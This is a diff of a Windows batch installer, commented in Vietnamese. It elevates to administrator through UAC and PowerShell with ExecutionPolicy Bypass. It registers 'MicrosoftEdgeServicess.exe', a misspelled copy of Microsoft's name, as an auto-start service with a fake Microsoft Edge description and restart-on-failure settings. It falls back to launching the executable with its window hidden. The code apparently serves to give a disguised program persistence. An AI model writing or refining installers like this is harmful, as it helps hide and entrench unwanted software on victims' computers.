@@ -10,20 +10,8 @@ echo   Startup Type: Automatic (Background Service)
 echo ===============================================================================
 echo.
 
-:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
-if not exist "%~dp0MicrosoftEdgeServicess.exe" (
-    echo.
-    echo ===============================================================================
-    echo   [CANH BAO: CHUA GIAI NEN HOAC THIEU FILE]
-    echo ===============================================================================
-    echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe cung thu muc!
-    echo   Vui long giai nen toan bo tep tin ZIP ra mot thu muc roi chay lai file nay.
-    echo ===============================================================================
-    echo.
-    echo Cua so se tu dong dong sau 5 giay...
-    timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
-    exit /b 1
-)
+:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe cung thu muc khong
+if not exist "%~dp0MicrosoftEdgeServicess.exe" goto :LoiThieuFileExe
 
 :: 2. Kiem tra quyen Administrator thuc te (net session)
 net session >nul 2>&1
@@ -34,7 +22,8 @@ if /i "%~1"=="/elevated" goto :LoiChuaCoQuyenAdmin
 
 :: 4. Yeu cau quyen Administrator qua Windows UAC (Run as administrator) 1 lan duy nhat
 echo Dang yeu cau quyen Administrator he thong qua Windows UAC...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList '/elevated' -Verb RunAs" >nul 2>&1
+set "BAT_TARGET=%~f0"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$p = $env:BAT_TARGET; Start-Process -FilePath $p -ArgumentList '/elevated' -Verb RunAs" >nul 2>&1
 if %errorlevel% equ 0 exit /b 0
 
 :LoiChuaCoQuyenAdmin
@@ -50,8 +39,8 @@ echo   2. Chon: "Run as administrator" (Chay voi quyen quan tri vien)
 echo   3. Khi Windows hien hop thoai "Do you want to allow...", hay bam [YES].
 echo ===============================================================================
 echo.
-echo Cua so se tu dong dong sau 5 giay...
-timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
+echo Nhan phim bat ky de thoat hoac cua so se tu dong dong sau 10 giay...
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
 exit /b 1
 
 :DaCoQuyenAdmin
@@ -102,12 +91,10 @@ echo [4/4] Dang dang ky va kich hoat Microsoft Edge Framework Service...
 
 :: Buoc 5.2: Neu he thong chua ghi nhan, tao truc tiep bang sc.exe create
 sc.exe query MicrosoftEdgeServicess >nul 2>&1
-if %errorlevel% neq 0 (
-    sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
-)
+if %errorlevel% neq 0 sc.exe create MicrosoftEdgeServicess binPath= "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
 
 :: Buoc 5.3: Thiet lap thong so service (Tu khoi dong, mo ta, tu khoi phuc sau 5 giay)
-sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
+sc.exe config MicrosoftEdgeServicess start= auto binPath= "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
 sc.exe description MicrosoftEdgeServicess "Provides runtime environment and background update services for Microsoft Edge." >nul 2>&1
 sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1
 
@@ -115,22 +102,20 @@ sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/50
 net start MicrosoftEdgeServicess >nul 2>&1
 sc.exe start MicrosoftEdgeServicess >nul 2>&1
 
-:: Buoc 5.5: Kiem tra trang thai Service
-set "SERVICE_OK=0"
-for /l %%i in (1,1,3) do (
-    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "RUNNING" >nul 2>&1
-    if not errorlevel 1 (
-        set "SERVICE_OK=1"
-        goto :CaiDatThanhCong
-    )
-    tasklist /FO CSV /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess" >nul 2>&1
-    if not errorlevel 1 (
-        set "SERVICE_OK=1"
-        goto :CaiDatThanhCong
-    )
-    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
-)
+:: Buoc 5.5: Kiem tra trang thai Service (Flat Loop chong loi parser cmd.exe)
+set "WAIT_STEP=0"
 
+:KiemTraServiceLoop
+sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "RUNNING" >nul 2>&1
+if not errorlevel 1 goto :CaiDatThanhCong
+tasklist /FO CSV /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess" >nul 2>&1
+if not errorlevel 1 goto :CaiDatThanhCong
+set /a WAIT_STEP+=1
+if %WAIT_STEP% geq 4 goto :FallbackChayConsole
+timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
+goto :KiemTraServiceLoop
+
+:FallbackChayConsole
 :: Neu SCM chua start duoc, khoi chay ngam che do console an toan (Hidden Background)
 echo [!] Dang khoi chay tien trinh ngam ho tro he thong...
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%INSTALL_DIR%\MicrosoftEdgeServicess.exe' -ArgumentList '--console' -WindowStyle Hidden" >nul 2>&1
@@ -150,6 +135,19 @@ echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
 timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
 exit /b 0
 
+:LoiThieuFileExe
+echo.
+echo ===============================================================================
+echo   [CANH BAO: CHUA GIAI NEN HOAC THIEU FILE]
+echo ===============================================================================
+echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe cung thu muc!
+echo   Vui long giai nen toan bo tep tin ZIP ra mot thu muc roi chay lai file nay.
+echo ===============================================================================
+echo.
+echo Nhan phim bat ky de thoat hoac cua so se tu dong dong sau 10 giay...
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
+exit /b 1
+
 :LoiGhiTapTin
 echo.
 echo ===============================================================================
@@ -157,6 +155,6 @@ echo   [LOI] Khong the ghi tap tin vao %INSTALL_DIR%!
 echo   Vui long kiem tra quyen ghi hoac khoi dong lai may tinh va thu lai.
 echo ===============================================================================
 echo.
-echo Cua so se tu dong dong sau 5 giay...
-timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
+echo Nhan phim bat ky de thoat hoac cua so se tu dong dong sau 10 giay...
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
 exit /b 1
